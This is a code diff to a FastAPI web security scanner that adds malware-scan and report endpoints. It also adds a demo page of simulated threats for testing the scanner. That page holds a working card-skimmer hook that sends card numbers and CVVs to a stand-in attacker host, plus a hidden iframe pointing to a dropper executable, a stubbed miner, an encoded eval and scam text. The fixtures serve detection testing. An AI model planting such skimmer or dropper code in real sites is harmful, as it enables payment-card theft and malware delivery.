@@ -46,7 +46,7 @@ async def serve_dashboard(request: Request):
 async def start_scan(payload: StartScanRequest, background_tasks: BackgroundTasks):
     target = payload.target_url.strip()
     if not target.startswith(("http://", "https://")):
-        target = "http://" + target
+        target = "https://" + target
 
     parsed = urlparse(target)
     if not parsed.netloc:
@@ -145,6 +145,124 @@ async def download_csv_report(scan_id: str):
         media_type="text/csv",
         filename=f"Inspire_Report_{scan_id}.csv"
     )
+
+# =============================================================================
+# MALWARE & THREAT DETECTION ENDPOINTS
+# =============================================================================
+
+class MalwareScanRequest(BaseModel):
+    target_url: str
+
+@app.post("/api/malware/scan")
+async def start_malware_scan(req: MalwareScanRequest):
+    target = req.target_url.strip()
+    if not target:
+        raise HTTPException(status_code=400, detail="Target URL is required.")
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
+    
+    result = await scanner_engine.run_malware_scan(target)
+    return result
+
+@app.get("/api/malware/status/{scan_id}")
+async def get_malware_scan_status(scan_id: str):
+    if not hasattr(scanner_engine, "active_malware_scans") or scan_id not in scanner_engine.active_malware_scans:
+        raise HTTPException(status_code=404, detail="Malware scan result not found.")
+    return scanner_engine.active_malware_scans[scan_id]
+
+@app.get("/api/malware/report/json/{scan_id}")
+async def download_malware_json_report(scan_id: str):
+    if not hasattr(scanner_engine, "active_malware_scans") or scan_id not in scanner_engine.active_malware_scans:
+        raise HTTPException(status_code=404, detail="Malware scan result not found.")
+    
+    result = scanner_engine.active_malware_scans[scan_id]
+    json_path = reporter.generate_malware_json_report(result)
+    return FileResponse(
+        json_path,
+        media_type="application/json",
+        filename=f"Inspire_Malware_Report_{scan_id}.json"
+    )
+
+@app.get("/api/malware/report/csv/{scan_id}")
+async def download_malware_csv_report(scan_id: str):
+    if not hasattr(scanner_engine, "active_malware_scans") or scan_id not in scanner_engine.active_malware_scans:
+        raise HTTPException(status_code=404, detail="Malware scan result not found.")
+    
+    result = scanner_engine.active_malware_scans[scan_id]
+    csv_path = reporter.generate_malware_csv_report(result)
+    return FileResponse(
+        csv_path,
+        media_type="text/csv",
+        filename=f"Inspire_Malware_Report_{scan_id}.csv"
+    )
+
+@app.get("/api/malware/report/html/{scan_id}")
+async def download_malware_html_report(scan_id: str):
+    if not hasattr(scanner_engine, "active_malware_scans") or scan_id not in scanner_engine.active_malware_scans:
+        raise HTTPException(status_code=404, detail="Malware scan result not found.")
+    
+    result = scanner_engine.active_malware_scans[scan_id]
+    html_path = reporter.generate_malware_html_report(result)
+    return FileResponse(
+        html_path,
+        media_type="text/html",
+        filename=f"Inspire_Malware_Report_{scan_id}.html"
+    )
+
+@app.get("/demo/malware-sample", response_class=HTMLResponse)
+async def demo_malware_sample_page():
+    """
+    Safe isolated sandbox page containing simulated malware signatures
+    for live demonstration and verification without actual harm.
+    """
+    return HTMLResponse(content="""<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Safe Sandbox Demo - Simulated Malware Test Page</title>
+</head>
+<body>
+    <h1>Safe Security Sandbox — Demo Store</h1>
+    <p>This is a safe local demo endpoint simulating client-side threat signatures for scanner testing.</p>
+
+    <!-- 1. Simulated Checkout Form -->
+    <form id="checkout_form">
+        <input type="text" name="card_number" placeholder="Credit Card Number">
+        <input type="text" name="cvv" placeholder="CVV">
+        <input type="text" name="card_exp" placeholder="Expiration">
+        <button type="submit">Submit Payment</button>
+    </form>
+
+    <!-- 2. Simulated Injected Scripts -->
+    <script>
+        // A. Simulated Cryptojacking Payload
+        var miner = {
+            start: function() { console.log("Coinhive miner hook simulation"); }
+        };
+        var CoinHive = { Anonymous: function(key) { return miner; } };
+        var activeMiner = CoinHive.Anonymous('DEMO_KEY');
+        activeMiner.start();
+
+        // B. Simulated Card Skimmer (Magecart) Hook
+        document.getElementById('checkout_form').addEventListener('submit', function(e) {
+            var cc = document.querySelector('input[name="card_number"]').value;
+            var cvv = document.querySelector('input[name="cvv"]').value;
+            fetch('http://attacker-exfiltrate.xyz/steal', { method: 'POST', body: JSON.stringify({cc_number: cc, cvv: cvv}) });
+        });
+
+        // C. Simulated Obfuscated Script
+        eval(unescape('%61%6c%65%72%74%28%27%74%65%73%74%27%29'));
+    </script>
+
+    <!-- 3. Simulated Stealth Hidden Iframe -->
+    <iframe src="http://malicious-exploit-kit.biz/dropper.exe" style="display:none" width="0" height="0"></iframe>
+
+    <!-- 4. Simulated Tech Support Scam Warning -->
+    <div style="display:none">
+        Warning: Your computer has been locked! Call Microsoft Support immediately at 1-800-000-0000.
+    </div>
+</body>
+</html>""")
 
 @app.websocket("/ws/scan/{scan_id}")
 async def scan_websocket_endpoint(websocket: WebSocket, scan_id: str):
